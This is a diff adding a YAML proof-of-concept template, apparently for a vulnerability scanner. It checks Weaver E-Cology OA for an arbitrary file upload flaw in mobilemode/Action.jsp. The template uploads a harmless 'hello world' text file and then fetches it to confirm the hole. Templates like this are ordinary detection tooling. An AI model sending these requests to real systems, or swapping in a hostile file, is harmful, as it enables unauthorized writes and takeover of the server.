@@ -1,0 +1,39 @@
+id: poc-yaml-weaver-e-cology-action-anyfile-upload
+info:
+  name: 泛微OA E-Cology action.jsp 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: e-cology
+  fofa: null
+requests:
+- method: POST
+  path: /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image
+  headers:
+    Content-Type: multipart/form-data; boundary=---***
+  data: '-----***
+
+    Content-Disposition: form-data; name="upload"; filename="test.txt"
+
+    Content-Type: text/plain
+
+
+    hello world
+
+    -----***--'
+  output:
+  - regex_match(body,"/mobilemode/upload/images/(?P<filename>.*?).txt")
+  expression: 'status_code == 200 &&
+
+    contains(body,"SUCCESS")
+
+    '
+- method: GET
+  path: /mobilemode/upload/images/{{.filename}}.txt
+  expression: 'status_code == 200 &&
+
+    body == "hello world"
+
+    '
+variables: {}
+transport: http
